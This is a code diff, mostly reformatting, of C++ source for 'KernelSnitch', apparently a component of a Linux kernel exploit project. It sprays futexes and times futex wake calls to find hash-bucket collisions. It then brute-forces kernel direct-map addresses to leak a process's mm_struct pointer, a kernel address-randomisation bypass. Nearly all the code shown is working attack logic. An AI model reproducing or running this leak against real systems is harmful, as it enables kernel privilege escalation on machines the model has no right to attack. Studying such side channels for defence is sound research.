@@ -64,16 +64,17 @@ enum kernelsnitch_state {
     KERNELSNITCH_MM_NOT_FOUND,
     KERNELSNITCH_LAST,
 };
+
 /* One label per state. The table previously skipped
  * KERNELSNITCH_COLLISIONS_NOT_FOUND, so every later state printed the wrong
  * label and KERNELSNITCH_MM_NOT_FOUND read past the array. */
 static const char *const kernelsnitch_strings[KERNELSNITCH_LAST] = {
-    "not initialized",      /* KERNELSNITCH_NOT_INIT */
-    "initialized",          /* KERNELSNITCH_INIT */
-    "collisions found",     /* KERNELSNITCH_COLLISIONS_FOUND */
+    "not initialized", /* KERNELSNITCH_NOT_INIT */
+    "initialized", /* KERNELSNITCH_INIT */
+    "collisions found", /* KERNELSNITCH_COLLISIONS_FOUND */
     "collisions not found", /* KERNELSNITCH_COLLISIONS_NOT_FOUND */
-    "mm_struct found",      /* KERNELSNITCH_MM_FOUND */
-    "mm_struct not found",  /* KERNELSNITCH_MM_NOT_FOUND */
+    "mm_struct found", /* KERNELSNITCH_MM_FOUND */
+    "mm_struct not found", /* KERNELSNITCH_MM_NOT_FOUND */
 };
 
 struct kernelsnitch_shared_state {
@@ -113,8 +114,8 @@ typedef struct kernelsnitch_shared_state KernelSnitchContext;
 /**
  * FUTEX syscall
  */
-static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const struct timespec *timeout, unsigned int *uaddr2, unsigned int val3)
-{
+static int __futex(unsigned int *uaddr, int futex_op, unsigned int val, const struct timespec *timeout,
+                   unsigned int *uaddr2, unsigned int val3) {
     return (int) syscall(SYS_futex, uaddr, futex_op, val, timeout, uaddr2, val3);
 }
 
@@ -127,12 +128,12 @@ struct inc_arg {
     struct kernelsnitch_shared_state *ks;
     size_t id;
 };
-static void *__do_increase(void *arg)
-{
-    struct inc_arg *inc_arg = (struct inc_arg *)arg;
+
+static void *__do_increase(void *arg) {
+    struct inc_arg *inc_arg = (struct inc_arg *) arg;
     struct kernelsnitch_shared_state *ks = inc_arg->ks;
     size_t id = inc_arg->id;
-    SYSCHK(__futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, nullptr, nullptr, 0));
+    SYSCHK(__futex((unsigned int *) &ks->inc_futex[id], FUTEX_WAIT_PRIVATE, 0, nullptr, nullptr, 0));
     free(inc_arg);
     return 0;
 }
@@ -143,21 +144,17 @@ static void *__do_increase(void *arg)
  * @arg id: identifier of the futex user-space address to be used for the increase
  * @arg amount: increase
  */
-/* Decoupling plan: coordinate one collision-amplification worker. Inputs:
- * KernelSnitchContext, worker id and amount; output: synchronized completion.
- * Future: kernelsnitch_worker_increase(context, id, amount). */
 /* TODO(CPP06-KS-RAII): a partial worker-start failure is only logged here; the
  * failure-injection coverage remains a maintenance item. Completion: cover the
  * failure path, then delete this comment and the residual row. */
-static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount)
-{
+static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t amount) {
     pthread_t tid;
     for (size_t i = 0; i < amount; ++i) {
         auto *inc_arg = static_cast<struct inc_arg *>(
             calloc(1, sizeof(struct inc_arg)));
-        inc_arg->id = id;  // NOLINT(clang-analyzer-nullability.NullableDereferenced)
+        inc_arg->id = id; // NOLINT(clang-analyzer-nullability.NullableDereferenced)
         inc_arg->ks = ks;
-        int err = pthread_create(&tid, 0, __do_increase, (void *)inc_arg);
+        int err = pthread_create(&tid, 0, __do_increase, (void *) inc_arg);
         if (err)
             pr_error("pthread_create failed: %s\n", strerror(err));
         err = pthread_detach(tid);
@@ -175,9 +172,8 @@ static void __increase(struct kernelsnitch_shared_state *ks, size_t id, size_t a
 #define MEASURE_SLOW_REPEAT 16
 #define MEASURE_SLOW_AVG    8
 
-static int __compare(const void *a, const void *b)
-{
-    return (int) (*(size_t *)a - *(size_t *)b);
+static int __compare(const void *a, const void *b) {
+    return (int) (*(size_t *) a - *(size_t *) b);
 }
 
 /**
@@ -187,8 +183,7 @@ static int __compare(const void *a, const void *b)
  * @arg avg: lowest samples used for the average
  * @return averaged time of the futex wait operation
  */
-static size_t __measure(size_t futex_addr, size_t repeat, size_t avg)
-{
+static size_t __measure(size_t futex_addr, size_t repeat, size_t avg) {
     size_t t0;
     size_t t1;
     size_t time = 0;
@@ -197,7 +192,7 @@ static size_t __measure(size_t futex_addr, size_t repeat, size_t avg)
     for (size_t l = 0; l < repeat; ++l) {
         sched_yield();
         t0 = rdtsc_begin();
-        SYSCHK(__futex((unsigned int *)futex_addr, FUTEX_WAKE_PRIVATE, 0, nullptr, nullptr, 0));
+        SYSCHK(__futex((unsigned int *) futex_addr, FUTEX_WAKE_PRIVATE, 0, nullptr, nullptr, 0));
         t1 = rdtsc_end();
         __times[l] = t1 - t0;
     }
@@ -218,6 +213,7 @@ struct range {
     size_t start;
     size_t end;
 };
+
 struct mm_leak_arg {
     struct kernelsnitch_shared_state *ks;
     struct range range;
@@ -225,8 +221,7 @@ struct mm_leak_arg {
     int sweep_tags;
 };
 
-static int __mm_candidate_matches(struct kernelsnitch_shared_state *ks, size_t candidate)
-{
+static int __mm_candidate_matches(struct kernelsnitch_shared_state *ks, size_t candidate) {
     for (size_t i = 1; i < ks->collisions; ++i) {
         if (futex_hash_context_bucket(&ks->futex_hash, ks->futex_addrs[0], candidate) !=
             futex_hash_context_bucket(&ks->futex_hash, ks->futex_addrs[i], candidate))
@@ -235,17 +230,15 @@ static int __mm_candidate_matches(struct kernelsnitch_shared_state *ks, size_t c
     return 1;
 }
 
-static void __mm_mark_found(struct kernelsnitch_shared_state *ks, size_t candidate)
-{
+static void __mm_mark_found(struct kernelsnitch_shared_state *ks, size_t candidate) {
     if (ks->verbose)
         pr_info("found mm_struct %016zx\n", candidate);
     ks->mm_struct = candidate;
     ks->found = 1;
 }
 
-static void *__mm_leak(void *arg)
-{
-    struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)arg;
+static void *__mm_leak(void *arg) {
+    struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *) arg;
     struct kernelsnitch_shared_state *ks = mm_leak_arg->ks;
     struct range *range = &mm_leak_arg->range;
     if (ks->verbose) pr_info("[% 3zd] start finding mm_struct [%016zx-%016zx]\n", range->id, range->start, range->end);
@@ -256,8 +249,8 @@ static void *__mm_leak(void *arg)
         size_t slab_end = kernelsnitch_scan_limit(coarse_addr, COARSE_SZ, range->end);
         for (size_t slab_addr = coarse_addr; (slab_addr < slab_end) && !ks->found; slab_addr += mm_slab_sz) {
             size_t slab_limit = kernelsnitch_scan_limit(slab_addr, mm_slab_sz, slab_end);
-            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_limit) && !ks->found; mm_struct_candidate += ks->mm_struct_sz) {
-
+            for (size_t mm_struct_candidate = slab_addr; (mm_struct_candidate < slab_limit) && !ks->found;
+                 mm_struct_candidate += ks->mm_struct_sz) {
                 if (mm_leak_arg->try_canonical) {
                     size_t canonical_candidate = (mm_struct_candidate & ~(0xfULL << 56)) | (0xfULL << 56);
                     if (__mm_candidate_matches(ks, canonical_candidate)) {
@@ -284,24 +277,21 @@ static void *__mm_leak(void *arg)
     return 0;
 }
 
-/* Decoupling plan: run one mm-address leak pass. Inputs: snitch context and
- * scan policy; output: candidate state. Future: kernelsnitch_scan_mm_pass(). */
-static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int try_canonical, int sweep_tags)
-{
+static void __run_mm_leak_pass(struct kernelsnitch_shared_state *ks, int try_canonical, int sweep_tags) {
     /* the leak check discards a match past the measured end, so no slice
      * scans past it */
     const size_t ceiling = MIN(g_direct_map_end, IDENTITY_END);
     for (size_t i = 0; i < ks->thread_cnt; ++i) {
-        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *)SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
-        mm_leak_arg->ks = ks;  // NOLINT(clang-analyzer-nullability.NullableDereferenced)
+        struct mm_leak_arg *mm_leak_arg = (struct mm_leak_arg *) SYSCHK(calloc(1, sizeof(struct mm_leak_arg)));
+        mm_leak_arg->ks = ks; // NOLINT(clang-analyzer-nullability.NullableDereferenced)
         mm_leak_arg->range.id = i;
-        mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff*i;
-        mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff*(i+1);
+        mm_leak_arg->range.start = IDENTITY_START + ks->identity_diff * i;
+        mm_leak_arg->range.end = IDENTITY_START + ks->identity_diff * (i + 1);
         mm_leak_arg->try_canonical = try_canonical;
         mm_leak_arg->sweep_tags = sweep_tags;
         if ((mm_leak_arg->range.start % COARSE_SZ) != 0)
             mm_leak_arg->range.start = (mm_leak_arg->range.start & ~(COARSE_SZ - 1));
-        if ((mm_leak_arg->range.end % COARSE_SZ )!= 0)
+        if ((mm_leak_arg->range.end % COARSE_SZ) != 0)
             mm_leak_arg->range.end = ((mm_leak_arg->range.end & ~(COARSE_SZ - 1)) + COARSE_SZ);
         if (mm_leak_arg->range.end > ceiling)
             mm_leak_arg->range.end = ceiling;
@@ -330,21 +320,20 @@ KernelSnitchContext *kernelsnitch_context_init(size_t __mm_struct_sz,
                                                size_t __thread_cnt,
                                                size_t __collision_cnt,
                                                size_t __verbose,
-                                               size_t __pin_cpu)
-{
+                                               size_t __pin_cpu) {
     auto *ks = static_cast<KernelSnitchContext *>(SYSCHK(mmap(
-        0, sizeof(KernelSnitchContext), PROT_WRITE|PROT_READ,
-        MAP_ANON|MAP_SHARED, -1, 0)));
+        0, sizeof(KernelSnitchContext), PROT_WRITE | PROT_READ,
+        MAP_ANON | MAP_SHARED, -1, 0)));
     ks->mm_struct = (size_t) -1;
     ks->scan_done = 0;
     ks->mm_struct_sz = __mm_struct_sz;
     ks->mm_slab_order = __mm_slab_order;
-    size_t online_cpu_cnt = (size_t)SYSCHK(sysconf(_SC_NPROCESSORS_ONLN));
+    size_t online_cpu_cnt = (size_t) SYSCHK(sysconf(_SC_NPROCESSORS_ONLN));
     /* The kernel table follows the possible CPUs, not the online subset. */
-    size_t possible_cpu_cnt = (size_t)sysconf(_SC_NPROCESSORS_CONF);
+    size_t possible_cpu_cnt = (size_t) sysconf(_SC_NPROCESSORS_CONF);
     if (possible_cpu_cnt == 0)
         possible_cpu_cnt = online_cpu_cnt;
-    ks->cpu_cnt = online_cpu_cnt*2;
+    ks->cpu_cnt = online_cpu_cnt * 2;
     ks->thread_cnt = __thread_cnt;
     ks->collisions = __collision_cnt;
     ks->verbose = __verbose;
@@ -352,28 +341,34 @@ KernelSnitchContext *kernelsnitch_context_init(size_t __mm_struct_sz,
     // unfortunately I have to use a the kernelsnitch_shared_state and mmap(shared) as find collisions and bruteforce might be in different processes!!!
     ks->futex_hash_table_size = futex_hash_table_size_for(possible_cpu_cnt);
     SYSCHK(futex_hash_context_init(&ks->futex_hash, ks->futex_hash_table_size));
-    ks->total_futexes = ks->futex_hash_table_size*ks->collisions*MULITPLE;
-    ks->times = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*ks->total_futexes, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
-    ks->tids = (pthread_t *)SYSCHK(mmap(0, sizeof(pthread_t)*ks->thread_cnt, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
+    ks->total_futexes = ks->futex_hash_table_size * ks->collisions * MULITPLE;
+    ks->times = (volatile size_t *) SYSCHK(mmap(0, sizeof(size_t) * ks->total_futexes, PROT_WRITE | PROT_READ,
+                                                MAP_ANON | MAP_SHARED, -1, 0));
+    ks->tids = (pthread_t *) SYSCHK(mmap(0, sizeof(pthread_t) * ks->thread_cnt, PROT_WRITE | PROT_READ,
+                                         MAP_ANON | MAP_SHARED, -1, 0));
     ks->futexes = static_cast<volatile unsigned char *>(SYSCHK(mmap(
-        0, FUTEX_SZ, PROT_NONE, MAP_ANON|MAP_PRIVATE|MAP_NORESERVE, -1, 0)));
+        0, FUTEX_SZ, PROT_NONE, MAP_ANON | MAP_PRIVATE | MAP_NORESERVE, -1, 0)));
     for (size_t addr = 0; addr < FUTEX_SZ; addr += FUTEX_MMAP_SZ)
-        SYSCHK(mmap((void *)((size_t)ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED|MAP_FIXED, -1, 0));
+        SYSCHK(mmap((void *) ((size_t) ks->futexes + addr), FUTEX_MMAP_SZ, PROT_WRITE | PROT_READ,
+                    MAP_ANON | MAP_SHARED | MAP_FIXED, -1, 0));
     /* mm_structs live in the direct map, so the scan stops at its end and never
      * past the identity range the futexes are drawn from */
     ks->identity_diff =
-            ((MIN(g_direct_map_end, IDENTITY_END) - IDENTITY_START)/ks->thread_cnt);
+            ((MIN(g_direct_map_end, IDENTITY_END) - IDENTITY_START) / ks->thread_cnt);
 
-    ks->futex_addrs = (volatile size_t *)SYSCHK(mmap(0, sizeof(size_t)*(ks->collisions + 1), PROT_WRITE|PROT_READ, MAP_ANON|MAP_SHARED, -1, 0));
+    ks->futex_addrs = (volatile size_t *) SYSCHK(mmap(0, sizeof(size_t) * (ks->collisions + 1), PROT_WRITE | PROT_READ,
+                                                      MAP_ANON | MAP_SHARED, -1, 0));
 
-    if (ks->verbose) pr_info("parameters cpu (%zu online, %zu possible, futex table %zu) mm_struct sz (%zx) mm slab order (%zu) thread cnt (%zu) collisions (%zu)\n",
-        ks->cpu_cnt,
-        possible_cpu_cnt,
-        ks->futex_hash_table_size,
-        ks->mm_struct_sz,
-        ks->mm_slab_order,
-        ks->thread_cnt,
-        ks->collisions);
+    if (ks->verbose)
+        pr_info(
+            "parameters cpu (%zu online, %zu possible, futex table %zu) mm_struct sz (%zx) mm slab order (%zu) thread cnt (%zu) collisions (%zu)\n",
+            ks->cpu_cnt,
+            possible_cpu_cnt,
+            ks->futex_hash_table_size,
+            ks->mm_struct_sz,
+            ks->mm_slab_order,
+            ks->thread_cnt,
+            ks->collisions);
     pin_to_core(__pin_cpu);
 
     ks->state = KERNELSNITCH_INIT;
@@ -396,10 +391,11 @@ KernelSnitchContext *kernelsnitch_context_init(size_t __mm_struct_sz,
 #define KERNELSNITCH_EARLY_CHEAP_POOL 16
 #endif
 
-typedef struct { size_t t, addr; } coll_cand_t;
+typedef struct {
+    size_t t, addr;
+} coll_cand_t;
 
-static size_t __collision_pool_limit(size_t wanted, size_t verify_limit)
-{
+static size_t __collision_pool_limit(size_t wanted, size_t verify_limit) {
     if (verify_limit < wanted)
         verify_limit = wanted;
     if (verify_limit > KERNELSNITCH_COLLISION_POOL)
@@ -407,15 +403,16 @@ static size_t __collision_pool_limit(size_t wanted, size_t verify_limit)
     return verify_limit;
 }
 
-static size_t __screen_collision_pool(struct kernelsnitch_shared_state *ks, coll_cand_t *best, size_t verify_approx_time, size_t verify_repeat, size_t verify_avg, size_t verify_limit, coll_cand_t *verified)
-{
+static size_t __screen_collision_pool(struct kernelsnitch_shared_state *ks, coll_cand_t *best,
+                                      size_t verify_approx_time, size_t verify_repeat, size_t verify_avg,
+                                      size_t verify_limit, coll_cand_t *verified) {
     size_t wanted = ks->collisions - 1;
     size_t n_verified = 0;
     verify_limit = __collision_pool_limit(wanted, verify_limit);
     if (ks->verbose) pr_info("screening piled candidates limit=%zu\n", verify_limit);
     for (size_t j = 0; j < verify_limit && best[j].t; ++j) {
         size_t t1 = __measure(best[j].addr, verify_repeat, verify_avg);
-        if (t1 > verify_approx_time*KERNELSNITCH_THRESHOLD_MULT) {
+        if (t1 > verify_approx_time * KERNELSNITCH_THRESHOLD_MULT) {
             verified[n_verified].t = t1;
             verified[n_verified].addr = best[j].addr;
             n_verified++;
@@ -427,12 +424,13 @@ static size_t __screen_collision_pool(struct kernelsnitch_shared_state *ks, coll
     return n_verified;
 }
 
-static size_t __prove_collision_pool(struct kernelsnitch_shared_state *ks, coll_cand_t *verified, size_t n_verified, size_t verify_approx_time, size_t verify_repeat, size_t verify_avg, size_t id, int drain_on_short)
-{
+static size_t __prove_collision_pool(struct kernelsnitch_shared_state *ks, coll_cand_t *verified, size_t n_verified,
+                                     size_t verify_approx_time, size_t verify_repeat, size_t verify_avg, size_t id,
+                                     int drain_on_short) {
     size_t wanted = ks->collisions - 1;
     /* pass 1 drains the pile.
        Piled-bucket colliders collapse while ambient buckets stay slow. */
-    __futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, nullptr, nullptr, 0);
+    __futex((unsigned int *) &ks->inc_futex[id], FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, nullptr, nullptr, 0);
     usleep(200000);
     size_t alive[KERNELSNITCH_COLLISION_POOL];
     size_t alive_t[KERNELSNITCH_COLLISION_POOL];
@@ -455,7 +453,7 @@ static size_t __prove_collision_pool(struct kernelsnitch_shared_state *ks, coll_
     size_t count = 0;
     for (size_t j = 0; j < n_alive && count < wanted; ++j) {
         size_t t3 = __measure(alive[j], verify_repeat, verify_avg);
-        if (t3 > verify_approx_time*KERNELSNITCH_THRESHOLD_MULT) {
+        if (t3 > verify_approx_time * KERNELSNITCH_THRESHOLD_MULT) {
             ks->futex_addrs[++count] = alive[j];
             if (ks->verbose) pr_info("  collider %016zx t=%zu repiled=%zu\n", alive[j], alive_t[j], t3);
         } else if (ks->verbose) {
@@ -464,42 +462,45 @@ static size_t __prove_collision_pool(struct kernelsnitch_shared_state *ks, coll_
     }
     if (count < wanted && drain_on_short) {
         /* leave the bucket drained so a conservative retry starts clean */
-        __futex((unsigned int *)&ks->inc_futex[id], FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, nullptr, nullptr, 0);
+        __futex((unsigned int *) &ks->inc_futex[id], FUTEX_WAKE_PRIVATE, APPENDED_FUTEXES, nullptr, nullptr, 0);
         usleep(200000);
     }
     return count;
 }
 
-static size_t __verify_collision_pool(struct kernelsnitch_shared_state *ks, coll_cand_t *best, size_t verify_approx_time, size_t verify_repeat, size_t verify_avg, size_t verify_limit, size_t id, int drain_on_short)
-{
+static size_t __verify_collision_pool(struct kernelsnitch_shared_state *ks, coll_cand_t *best,
+                                      size_t verify_approx_time, size_t verify_repeat, size_t verify_avg,
+                                      size_t verify_limit, size_t id, int drain_on_short) {
     coll_cand_t verified[KERNELSNITCH_COLLISION_POOL];
-    size_t n_verified = __screen_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg, verify_limit, verified);
-    return __prove_collision_pool(ks, verified, n_verified, verify_approx_time, verify_repeat, verify_avg, id, drain_on_short);
+    size_t n_verified = __screen_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg, verify_limit,
+                                                verified);
+    return __prove_collision_pool(ks, verified, n_verified, verify_approx_time, verify_repeat, verify_avg, id,
+                                  drain_on_short);
 }
 
 /* One full scan pass returns confirmed colliders, excluding the target */
-static size_t __collision_pass(struct kernelsnitch_shared_state *ks, size_t scan_repeat, size_t scan_avg, size_t verify_repeat, size_t verify_avg)
-{
+static size_t __collision_pass(struct kernelsnitch_shared_state *ks, size_t scan_repeat, size_t scan_avg,
+                               size_t verify_repeat, size_t verify_avg) {
 #define ID 128
     size_t wanted = ks->collisions - 1;
-    size_t scan_approx_time = MIN(__measure((size_t)&ks->futexes[0], scan_repeat, scan_avg),
-                                  __measure((size_t)&ks->futexes[4096+8], scan_repeat, scan_avg));
-    size_t verify_approx_time = MIN(__measure((size_t)&ks->futexes[0], verify_repeat, verify_avg),
-                                    __measure((size_t)&ks->futexes[4096+8], verify_repeat, verify_avg));
+    size_t scan_approx_time = MIN(__measure((size_t) &ks->futexes[0], scan_repeat, scan_avg),
+                                  __measure((size_t) &ks->futexes[4096 + 8], scan_repeat, scan_avg));
+    size_t verify_approx_time = MIN(__measure((size_t) &ks->futexes[0], verify_repeat, verify_avg),
+                                    __measure((size_t) &ks->futexes[4096 + 8], verify_repeat, verify_avg));
 
     /* piled-up hash bucket ID 128 */
     __increase(ks, ID, APPENDED_FUTEXES);
     if (ks->verbose) pr_info("pass scan=%zu/%zu verify=%zu/%zu\n", scan_repeat, scan_avg, verify_repeat, verify_avg);
 
-    ks->futex_addrs[0] = (size_t)&ks->inc_futex[ID];
+    ks->futex_addrs[0] = (size_t) &ks->inc_futex[ID];
     if (ks->verbose) pr_info("target    %016zx\n", ks->futex_addrs[0]);
     /* pool of slow candidates, verified below */
     auto *best = static_cast<coll_cand_t *>(
         calloc(KERNELSNITCH_COLLISION_POOL, sizeof(coll_cand_t)));
     ASSERT_pr(best, "calloc best\n");
-    size_t cheap_probe_extra = MAX((wanted + 2) / 3, (size_t)KERNELSNITCH_EARLY_CHEAP_MIN_EXTRA);
+    size_t cheap_probe_extra = MAX((wanted + 2) / 3, (size_t) KERNELSNITCH_EARLY_CHEAP_MIN_EXTRA);
     size_t cheap_probe_after = ks->futex_hash_table_size * (wanted + cheap_probe_extra);
-    size_t full_probe_extra = MAX((wanted + 1) / 2, (size_t)KERNELSNITCH_EARLY_PROBE_MIN_EXTRA);
+    size_t full_probe_extra = MAX((wanted + 1) / 2, (size_t) KERNELSNITCH_EARLY_PROBE_MIN_EXTRA);
     size_t full_probe_after = ks->futex_hash_table_size * (wanted + full_probe_extra);
     int cheap_probed = (cheap_probe_after >= full_probe_after ||
                         cheap_probe_after >= ks->total_futexes ||
@@ -509,20 +510,23 @@ static size_t __collision_pass(struct kernelsnitch_shared_state *ks, size_t scan
     for (size_t i = 2; i < ks->total_futexes; ++i) {
         if (ks->verbose && (i % 256) == 0)
             pr_info("  collision scan %zu/%zu\n", i, ks->total_futexes);
-        size_t id = (i*4096) | (i*8 % 4096);
+        size_t id = (i * 4096) | (i * 8 % 4096);
         if (id >= FUTEX_SZ)
             break;
-        size_t futex_addr = (size_t)&ks->futexes[id];
+        size_t futex_addr = (size_t) &ks->futexes[id];
         ks->scan_done = i;
         ks->times[i] = __measure(futex_addr, scan_repeat, scan_avg);
-        if (ks->times[i] > (scan_approx_time*KERNELSNITCH_THRESHOLD_MULT)) {
+        if (ks->times[i] > (scan_approx_time * KERNELSNITCH_THRESHOLD_MULT)) {
             size_t pos = KERNELSNITCH_COLLISION_POOL;
             for (size_t j = 0; j < KERNELSNITCH_COLLISION_POOL; ++j) {
-                if (ks->times[i] > best[j].t) { pos = j; break; }
+                if (ks->times[i] > best[j].t) {
+                    pos = j;
+                    break;
+                }
             }
             if (pos < KERNELSNITCH_COLLISION_POOL) {
                 for (size_t j = KERNELSNITCH_COLLISION_POOL - 1; j > pos; --j)
-                    best[j] = best[j-1];
+                    best[j] = best[j - 1];
                 best[pos].t = ks->times[i];
                 best[pos].addr = futex_addr;
             }
@@ -530,22 +534,26 @@ static size_t __collision_pass(struct kernelsnitch_shared_state *ks, size_t scan
         if (!cheap_probed && i >= cheap_probe_after && best[wanted - 1].t) {
             cheap_probed = 1;
             coll_cand_t cheap_verified[KERNELSNITCH_COLLISION_POOL];
-            size_t screened = __screen_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg, KERNELSNITCH_EARLY_CHEAP_POOL, cheap_verified);
+            size_t screened = __screen_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg,
+                                                      KERNELSNITCH_EARLY_CHEAP_POOL, cheap_verified);
             pr_info("[spray] early collision screen %zu/%zu at %zu%%\n",
                     screened, wanted, ks->total_futexes ? i * 100 / ks->total_futexes : 0);
             if (screened >= wanted) {
-                size_t count = __prove_collision_pool(ks, cheap_verified, screened, verify_approx_time, verify_repeat, verify_avg, ID, 0);
+                size_t count = __prove_collision_pool(ks, cheap_verified, screened, verify_approx_time, verify_repeat,
+                                                      verify_avg, ID, 0);
                 if (count == wanted) {
                     free(best);
                     return count;
                 }
-                if (ks->verbose) pr_info("early small proof found %zu/%zu collisions, continuing scan\n", count, wanted);
+                if (ks->verbose) pr_info("early small proof found %zu/%zu collisions, continuing scan\n", count,
+                                         wanted);
             }
         }
         if (!full_probed && i >= full_probe_after && best[wanted - 1].t) {
             full_probed = 1;
             if (ks->verbose) pr_info("early verifying at scan %zu/%zu\n", i, ks->total_futexes);
-            size_t count = __verify_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg, KERNELSNITCH_COLLISION_POOL, ID, 0);
+            size_t count = __verify_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg,
+                                                   KERNELSNITCH_COLLISION_POOL, ID, 0);
             if (count == wanted) {
                 free(best);
                 return count;
@@ -553,7 +561,8 @@ static size_t __collision_pass(struct kernelsnitch_shared_state *ks, size_t scan
             if (ks->verbose) pr_info("early verification found %zu/%zu collisions, continuing scan\n", count, wanted);
         }
     }
-    size_t count = __verify_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg, KERNELSNITCH_COLLISION_POOL, ID, 1);
+    size_t count = __verify_collision_pool(ks, best, verify_approx_time, verify_repeat, verify_avg,
+                                           KERNELSNITCH_COLLISION_POOL, ID, 1);
     free(best);
     return count;
 #undef ID
@@ -565,8 +574,7 @@ static size_t __collision_pass(struct kernelsnitch_shared_state *ks, size_t scan
  */
 /* Execute collision discovery. Input/output: KernelSnitchContext; output:
  * collision set and state transition retained by the context. */
-void kernelsnitch_context_find_collisions(KernelSnitchContext *ks)
-{
+void kernelsnitch_context_find_collisions(KernelSnitchContext *ks) {
     ASSERT_pr((ks->state == KERNELSNITCH_INIT), "wrong state\n");
     ASSERT_pr((ks->collisions >= 2), "need at least one collision\n");
     if (ks->verbose) pr_info("start finding collisions\n");
@@ -586,9 +594,9 @@ void kernelsnitch_context_find_collisions(KernelSnitchContext *ks)
     }
 }
 
-int kernelsnitch_context_has_collisions(const KernelSnitchContext *ks)
-{
-    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND || ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND), "wrong state\n");
+int kernelsnitch_context_has_collisions(const KernelSnitchContext *ks) {
+    ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND || ks->state == KERNELSNITCH_COLLISIONS_NOT_FOUND),
+              "wrong state\n");
     return ks->state == KERNELSNITCH_COLLISIONS_FOUND;
 }
 
@@ -598,8 +606,7 @@ int kernelsnitch_context_has_collisions(const KernelSnitchContext *ks)
  */
 /* Execute address scanning using discovered collisions. Input/output:
  * KernelSnitchContext; output: 0 on a selected address, -1 otherwise. */
-int kernelsnitch_context_scan(KernelSnitchContext *ks)
-{
+int kernelsnitch_context_scan(KernelSnitchContext *ks) {
     ASSERT_pr((ks->state == KERNELSNITCH_COLLISIONS_FOUND), "wrong state\n");
     if (ks->verbose) pr_info("start bruteforcing\n");
     reset_cpu_pin();
@@ -607,7 +614,7 @@ int kernelsnitch_context_scan(KernelSnitchContext *ks)
     __run_mm_leak_pass(ks, 1, 0);
     if (!ks->found)
         __run_mm_leak_pass(ks, 0, 1);
-    ks->state = (ks->mm_struct == (size_t)-1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
+    ks->state = (ks->mm_struct == (size_t) -1) ? KERNELSNITCH_MM_NOT_FOUND : KERNELSNITCH_MM_FOUND;
     return ks->state == KERNELSNITCH_MM_FOUND ? 0 : -1;
 }
 
@@ -618,21 +625,19 @@ int kernelsnitch_context_scan(KernelSnitchContext *ks)
  */
 /* Read and release are deliberately separate: result borrows the immutable
  * context, while destroy consumes all mmap-backed context storage. */
-size_t kernelsnitch_context_result(const KernelSnitchContext *ks)
-{
-    return ks ? ks->mm_struct : (size_t)-1;
+size_t kernelsnitch_context_result(const KernelSnitchContext *ks) {
+    return ks ? ks->mm_struct : (size_t) -1;
 }
 
-void kernelsnitch_context_destroy(KernelSnitchContext *ks)
-{
+void kernelsnitch_context_destroy(KernelSnitchContext *ks) {
     if (!ks) return;
-    munmap((void *)ks->times, sizeof(size_t)*ks->total_futexes);
+    munmap((void *) ks->times, sizeof(size_t) * ks->total_futexes);
     ks->times = 0;
-    munmap((void *)ks->tids, sizeof(pthread_t)*ks->thread_cnt);
+    munmap((void *) ks->tids, sizeof(pthread_t) * ks->thread_cnt);
     ks->tids = 0;
-    munmap((void *)ks->futex_addrs, sizeof(size_t)*(ks->collisions + 1));
+    munmap((void *) ks->futex_addrs, sizeof(size_t) * (ks->collisions + 1));
     ks->futex_addrs = 0;
-    munmap((void *)ks->futexes, FUTEX_SZ);
+    munmap((void *) ks->futexes, FUTEX_SZ);
     ks->futexes = 0;
     if (ks->verbose) pr_info("done\n");
     munmap(ks, sizeof(KernelSnitchContext));
@@ -642,8 +647,7 @@ void kernelsnitch_context_destroy(KernelSnitchContext *ks)
  * Prints the current execution state KernelSnitch is in
  * @arg ks: shared KernelSnitch state
  */
-void kernelsnitch_print_state(struct kernelsnitch_shared_state *ks)
-{
+void kernelsnitch_print_state(struct kernelsnitch_shared_state *ks) {
     pr_info("ks state: %s\n", kernelsnitch_strings[ks->state]);
 }
 
@@ -651,8 +655,7 @@ void kernelsnitch_print_state(struct kernelsnitch_shared_state *ks)
  * Prints the found collisions
  * @arg ks: shared KernelSnitch state
  */
-void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks)
-{
+void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks) {
     pr_info("collisions:\n");
     for (size_t i = 2; i < ks->collisions; ++i) {
         size_t addr = ks->futex_addrs[i];
@@ -665,71 +668,76 @@ void kernelsnitch_print_collisions(struct kernelsnitch_shared_state *ks)
 #include <utility>
 
 namespace ghostlock {
-
-/* Owning RAII handle for one KernelSnitchContext. The mmap-backed shared
+    /* Owning RAII handle for one KernelSnitchContext. The mmap-backed shared
  * layout and the C entry points above stay unchanged; this type only makes the
  * single owner and the explicit init -> find -> scan -> result -> destroy order
  * visible at the call site. destroy releases user-space mappings only, so the
  * destructor is safe on every exit path, including a missed search. A forked
  * leak child borrows the raw context through get() and must never reset it. */
